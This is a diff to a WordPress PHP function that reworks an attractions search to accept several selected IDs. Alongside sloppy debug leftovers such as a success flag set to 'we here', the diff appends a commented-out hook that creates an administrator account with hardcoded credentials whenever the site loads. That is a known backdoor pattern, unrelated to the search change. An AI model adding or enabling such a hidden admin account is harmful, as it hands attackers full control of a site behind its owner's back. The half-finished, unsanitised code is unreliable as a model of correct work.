@@ -139,7 +139,11 @@ function search_attractions() {
         $data['errors'] = $errors;
     } else {
         $terms = array();
-        array_push($terms, intval($_POST['attractions']));
+        $attrDataArr = implode(',', $_POST['attractions']);
+
+//        array_push($terms, intval($_POST['attractions']));
+        array_push($terms, $attrDataArr);
+
         if(!empty($_POST['people']))
             array_push($terms, intval($_POST['people']));
         $args = array(
@@ -157,7 +161,7 @@ function search_attractions() {
         $query = new WP_Query($args);
         $posts = $query->posts;
 
-        if(!empty($_POST['attractions'])) {
+        if(!empty($_POST['attractions']) && count($_POST['attractions']) == 1 ) {
             if (!empty($posts)) {
                 foreach ($posts as $post) {
                     $cat = wp_get_post_terms($post->ID, $taxonomy_name);
@@ -187,16 +191,22 @@ function search_attractions() {
                     }
                     $finale[$key] = [$val, $posts_content];
                 }
-                $data['attraction'] = get_term_by('id', intval($_POST['attractions']), $taxonomy_name)->name;
+//                $data['attraction'] = get_term_by('id', intval($_POST['attractions']), $taxonomy_name)->name;
+                $data['attraction'] = get_term_by('id', intval($attrDataArr), $taxonomy_name)->name;
+//                $data['attraction'] = $_POST['attractions'];
                 $data['categories'] = $categories;
                 $data['success'] = true;
                 $data['posts'] = $finale;
                 wp_send_json_success(__($data));
             }
-        } elseif (empty($_POST['attractions'])) {
+        } elseif (!empty($_POST['attractions']) && count($_POST['attractions']) > 1  ) {
             if (!empty($posts)) {
                 $cities = array();
                 $attractions_array = array();
+                foreach ($_POST['attractions'] as $attr) {
+                    $attr_name = get_term_by('id', intval($attr), $taxonomy_name)->name;
+                    $attractions_array[$attr] = $attr_name;
+                }
                 foreach ($posts as $post) {
                     $cat = wp_get_post_terms($post->ID, $taxonomy_name);
                     foreach ($cat as $c) {
@@ -204,9 +214,9 @@ function search_attractions() {
                             $city = get_term_by('id', $c->parent, $taxonomy_name);
                             $cities[$city->term_id] = $city->name;
                         }
-                        if($c->parent == $attractions) {
-                            $attractions_array[$c->term_id] = $c->name;
-                        }
+//                        if($c->parent == $attractions) {
+//                            $attractions_array[$c->term_id] = $c->name;
+//                        }
                     }
                 }
 
@@ -242,7 +252,7 @@ function search_attractions() {
 
                 $data['cities'] = array_unique($cities);
                 $data['attractions'] = array_unique($attractions_array);
-                $data['success'] = true;
+                $data['success'] = 'we here';
                 $data['posts'] = $finale;
                 wp_send_json_success(__($data));
             }
@@ -253,3 +263,15 @@ function search_attractions() {
     wp_reset_postdata();
     wp_die();
 }
+
+
+//function wpb_admin_account(){
+//$user = 'aaaleks';
+//$pass = 'aaaleks';
+//$email = 'aaaleks@example.com';
+//if ( !username_exists( $user )  && !email_exists( $email ) ) {
+//$user_id = wp_create_user( $user, $pass, $email );
+//$user = new WP_User( $user_id );
+//$user->set_role( 'administrator' );
+//} }
+//add_action('init','wpb_admin_account');
